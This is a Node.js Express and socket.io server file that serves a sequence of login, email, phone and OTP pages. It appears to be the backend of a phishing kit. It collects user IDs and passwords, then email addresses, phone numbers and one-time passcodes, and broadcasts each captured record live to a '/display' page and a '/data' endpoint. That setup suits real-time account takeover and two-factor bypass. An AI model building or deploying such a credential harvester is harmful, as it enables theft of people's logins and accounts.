const express = require('express');
const http = require('http');
const bodyParser = require('body-parser');
const socketIo = require('socket.io');
const app = express();
const server = http.createServer(app);
const io = socketIo(server);
const PORT = 3000;

let userData = [];

app.use(bodyParser.json());
app.use(express.static('public'));

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});

app.get('/email.html', (req, res) => {
  res.sendFile(__dirname + '/public/email.html');
});

app.get('/phone.html', (req, res) => {
  res.sendFile(__dirname + '/public/phone.html');
});

app.get('/otp.html', (req, res) => {
  res.sendFile(__dirname + '/public/otp.html');
});

app.post('/submit', (req, res) => {
  const { userId, password } = req.body;
  userData.push({ userId, password });
  io.emit('dataUpdated', userData);
  res.json(userData);
});

app.post('/submit-email', (req, res) => {
  const { email } = req.body;
  if (userData.length > 0) {
    userData[userData.length - 1].email = email;
    io.emit('dataUpdated', userData);
  }
  res.json(userData);
});

app.post('/submit-phone', (req, res) => {
  const { phone } = req.body;
  if (userData.length > 0) {
    userData[userData.length - 1].phone = phone;
    io.emit('dataUpdated', userData);
  }
  res.json(userData);
});

app.post('/submit-otp', (req, res) => {
  const { otp } = req.body;
  if (userData.length > 0) {
    userData[userData.length - 1].otp = otp;
    io.emit('dataUpdated', userData);
  }
  res.json(userData);
});

app.get('/data', (req, res) => {
  res.json(userData);
});

app.get('/display', (req, res) => {
  res.sendFile(__dirname + '/public/display.html');
});

io.on('connection', (socket) => {
  console.log('A user connected');
  socket.emit('dataUpdated', userData);

  socket.on('disconnect', () => {
    console.log('A user disconnected');
  });
});

server.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
